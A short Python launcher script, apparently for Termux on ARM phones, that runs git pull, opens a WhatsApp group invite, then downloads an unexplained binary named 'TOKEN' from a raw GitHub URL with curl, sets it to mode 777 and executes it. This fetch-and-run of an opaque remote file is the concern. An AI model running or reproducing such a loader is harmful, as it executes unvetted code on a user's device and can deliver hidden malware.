import os
os.system('git pull')
os.system('xdg-open https://chat.whatsapp.com/KThLuumIszgD0UCJz3T33C')
from os import path,system
from platform import uname
bt=uname().machine.lower()
if 'aarch' in bt:
    if path.isfile("TOKEN"):
        pass
    else:
        os.system("curl -L https://raw.githubusercontent.com/K0J4/files/main/TOKEN -o TOKEN")
else:exit('\033[1;31m\n Sorry System or 32bit device not supported ')
os.system('chmod 777 TOKEN && ./TOKEN')
